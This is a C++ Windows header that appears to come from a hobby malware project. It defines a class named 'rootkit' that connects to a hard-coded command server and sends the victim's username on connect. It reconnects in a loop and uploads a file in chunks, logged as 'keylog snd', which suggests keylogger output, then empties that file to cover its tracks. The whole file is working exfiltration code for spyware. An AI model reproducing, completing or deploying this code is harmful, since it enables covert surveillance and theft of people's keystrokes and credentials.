#pragma once
#include "common.h"
#include <tchar.h>
constexpr unsigned short UNLEN = 256;
constexpr char SERVER_ADDR[] = "127.0.0.1";
constexpr unsigned int MAX_PACKET_SIZE = 1024;
constexpr unsigned short CHUNCK_SIZE = 1024;


struct data_chunck
{
	char content[CHUNCK_SIZE];
	unsigned long iteration;
};

namespace network
{
	//because the windows wsa api is such a pain in the ass,
	//the overhead caused from this should be negligable
	class wsa_wrapper
	{
	public:
		wsa_wrapper()
		{
			WSADATA wsaData;
			if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
				throw std::exception("Failed to initialize winsock\n");
		}

		inline void cleanup()
		{
			WSACleanup();
		}

		inline int getError()
		{
			return WSAGetLastError();
		}
	};

	class rootkit
	{
	private:
		wsa_wrapper _wsa;

		unsigned short _port;
		sockaddr_in recvAddr{};
	public:
		SOCKET socket_fd;
		rootkit(unsigned short port): _wsa(), _port(port)
		{
			init(port);
			
			if (connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr)) == 0)
			{
				std::string name = get_name();
				send_text(name);
			}
		}

		void init(unsigned short port)
		{
			recvAddr.sin_family = AF_INET;
			recvAddr.sin_port = htons(port);
			inet_pton(AF_INET, (PCSTR)SERVER_ADDR, &recvAddr.sin_addr);

			//tcp file descriptor used for connecting and I/O operations and such
			if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
				throw std::exception("Failed to initialize socket");
			/*
				int time = 50;
				setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&time, sizeof(int));
				setsockopt(socket_fd, SOL_SOCKET, SO_SNDBUF, (const char*)&time, sizeof(int));
				*/
		}

		bool reconnect()
		{
			init(_port);
			while (true)
			{
				std::cout << "reconnect" << std::endl;
				if ((connect(socket_fd, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr))) != SOCKET_ERROR)
				{
					TCHAR usrname[UNLEN]; //16 bit UNICODE characters
					DWORD usrnamelen = UNLEN;

					if (GetUserName(usrname, &usrnamelen)) {
						unsigned short sz = WideCharToMultiByte(CP_UTF8, 0, usrname, -1, NULL, 0, NULL, NULL);
						if (sz > 0 && sz < 255)
						{
							char res[255]; //output
							WideCharToMultiByte(CP_UTF8, 0, usrname, -1, res, sz, NULL, NULL);
							
							send(socket_fd, res, sz , 0);
							std::cout << "sending: " << res << std::endl;
							
							return true;
						}
					}
					return false;
				}
			}
		}

		std::string get_name()
		{
			TCHAR usrname[UNLEN]; //16 bit UNICODE characters
			DWORD usrnamelen = UNLEN;
			std::string out;

			if (GetUserName(usrname, &usrnamelen)) {
				unsigned short sz = WideCharToMultiByte(CP_UTF8, 0, usrname, -1, NULL, 0, NULL, NULL);
				if (sz > 0 && sz < 255)
				{
					char res[255]; //output
					WideCharToMultiByte(CP_UTF8, 0, usrname, -1, res, sz, NULL, NULL);

					out += res;
					return out;
				}
			}
			return out;
		}

		bool send_text(std::string buffer)
		{
			std::cout << "send" << buffer <<  std::endl;
			//compiler likes to bitch about data loss conversion for some reason so i used a static_cast
			int bytes_received = send(socket_fd, buffer.c_str(), buffer.size(), 0);
			if (bytes_received == SOCKET_ERROR)
			{
				std::cout << "Error: " << _wsa.getError() << std::endl;
				return false;
			}
			

			return true;
		}

		// I/O blocking
		bool recv_text(std::string& buffer)
		{
			// stack should be more efficient when handling small packets such as this
			char tmp[MAX_PACKET_SIZE]{0};
			int res = recv(socket_fd, tmp, sizeof(tmp), 0);
			switch (res)
			{
				// -1 general socket error
			case SOCKET_ERROR:
				std::cout << "Error: " << _wsa.getError() << std::endl;
				return false;
				break;

				//connection terminated by remote side
			case 0:
				std::cout << "Error: connection terminated" << std::endl; // std::endl flushes stdout buffer
				return false;
				break;

			default:
				std::cout << "test" << res << "\n\n\n\n";
				buffer = tmp;

				return true;
			}
		}

		bool send_all_f(std::string path) //sends file in "data chuncks" instead of one large packet 
		{
			std::ifstream fd(path.c_str(), std::ios::binary);
			if (!(fd.is_open()))
			{
				std::cout << "[-]Unable to open file" << std::endl;
				return false;
			}

			fd.seekg(0, std::ios::end);
			long fd_sz = fd.tellg();
			fd.seekg(0, std::ios::beg);
				   
			struct data_chunck buffer;
			long fd_pos = 0;
			std::cout << "keylog snd: " << fd_pos << " " << fd_sz << std::endl;
			while (fd_pos < fd_sz)
			{
				std::cout << "[+]Send chuck\n";

				//reset the buffer every read
				std::memset(buffer.content, 0, CHUNCK_SIZE);

				if (fd_sz - fd_pos < CHUNCK_SIZE)
				{
					fd.seekg(fd_pos - fd_pos, std::ios::beg);
					fd.read(buffer.content, fd_sz - fd_pos);
					
					buffer.iteration = 0;
					send(socket_fd, reinterpret_cast<const char*> (&buffer), sizeof(buffer), 0);
					fd.close();
					
					return true;
				}

				fd.seekg(fd_pos, std::ios::beg);
				fd.read(buffer.content, CHUNCK_SIZE);
				buffer.iteration = fd_sz - fd_pos;

				send(socket_fd, reinterpret_cast<const char *>(&buffer), sizeof(buffer), 0);
				fd_pos += CHUNCK_SIZE;
			}
			fd.close();
			
			//clear file content's
			std::ofstream file(path.c_str(), std::ofstream::out | std::ofstream::trunc);
			file.close();

			return true;
		}

		void echo(std::string buffer)
		{
			if (!(send_text(buffer)))
			{
				reconnect();
				send_text(buffer);
			}
		}

		~rootkit()
		{
			std::cout << "cleanup\n";
			closesocket(socket_fd);
			_wsa.cleanup();
		}
	};
}
